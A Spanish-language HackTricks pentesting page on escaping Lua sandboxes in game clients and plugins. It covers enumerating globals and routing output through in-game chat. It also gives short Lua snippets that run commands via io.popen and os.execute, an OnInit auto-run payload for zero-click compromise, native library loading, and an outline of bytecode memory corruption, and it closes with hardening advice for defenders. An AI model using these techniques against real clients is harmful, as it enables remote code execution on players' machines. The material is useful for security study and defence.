# Bypass Lua sandboxes (VMs embebidos, clientes de juego)

{{#include ../../../banners/hacktricks-training.md}}

Esta página recopila técnicas prácticas para enumerar y escapar de las "sandboxes" de Lua embebidas en aplicaciones (notablemente clientes de juego, plugins o motores de scripting dentro de la app). Muchos motores exponen un entorno Lua restringido, pero dejan globals poderosas accesibles que permiten ejecución arbitraria de comandos o incluso corrupción de memoria nativa cuando cargadores de bytecode están expuestos.

Ideas clave:
- Trata la VM como un entorno desconocido: enumera _G y descubre qué primitivas peligrosas son accesibles.
- Cuando stdout/print esté bloqueado, abusa de cualquier canal UI/IPC dentro de la VM como sumidero de salida para observar resultados.
- Si io/os está expuesto, a menudo tienes ejecución directa de comandos (io.popen, os.execute).
- Si load/loadstring/loadfile están expuestos, ejecutar bytecode de Lua creado puede subvertir la seguridad de memoria en algunas versiones (≤5.1 los verificadores son bypassables; 5.2 eliminó el verificador), habilitando explotación avanzada.

## Enumerar el entorno sandbox

- Volcar el entorno global para inventariar tablas/funciones accesibles:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Si no hay print() disponible, reutiliza canales dentro de la VM. Ejemplo de un script de housing de un MMO donde la salida del chat solo funciona después de una llamada de sonido; lo siguiente construye una función de salida fiable:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generaliza este patrón para tu objetivo: cualquier textbox, toast, logger o UI callback que acepte strings puede actuar como stdout para reconnaissance.

## Ejecución directa de comandos si io/os están expuestos

Si el sandbox todavía expone las librerías estándar io u os, probablemente tengas ejecución inmediata de comandos:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notas:
- La ejecución ocurre dentro del client process; muchas capas anti-cheat/antidebug que bloquean external debuggers no impedirán la creación de procesos in-VM.
- También revisa: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Disparadores Zero-click vía auto-run callbacks

Si la host application envía scripts a los clientes y la VM expone auto-run hooks (p. ej., OnInit/OnLoad/OnEnter), coloca tu payload allí para drive-by compromise tan pronto como se cargue el script:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Cualquier callback equivalente (OnLoad, OnEnter, etc.) generaliza esta técnica cuando los scripts son transmitidos y ejecutados automáticamente en el cliente.

## Dangerous primitives to hunt during recon

Durante la enumeración de _G, busca específicamente:
- io, os: io.popen, os.execute, I/O de archivos, acceso al entorno.
- load, loadstring, loadfile, dofile: ejecutar código fuente o bytecode; permite cargar bytecode no confiable.
- package, package.loadlib, require: carga dinámica de librerías y exposición de módulos.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, y hooks.
- LuaJIT-only: ffi.cdef, ffi.load para llamar código nativo directamente.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalada opcional: abusando de los cargadores de bytecode de Lua

Cuando load/loadstring/loadfile son accesibles pero io/os están restringidos, la ejecución de bytecode de Lua manipulado puede conducir a primitivas de divulgación y corrupción de memoria. Hechos clave:
- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.
- Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited.
- Los flujos de trabajo típicos: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), y luego pivotar hacia arbitrary read/write o native code execution.

Este camino es específico del engine/version y requiere RE. Consulta las referencias para deep dives, exploitation primitives y ejemplo de gadgetry en juegos.

## Notas de detección y hardening (para defensores)

- Lado servidor: rechazar o reescribir scripts de usuario; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Lado cliente: ejecutar Lua con un _ENV mínimo, prohibir la carga de bytecode, reintroducir un verificador de bytecode estricto o comprobaciones de firma, y bloquear la creación de procesos desde el proceso cliente.
- Telemetría: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
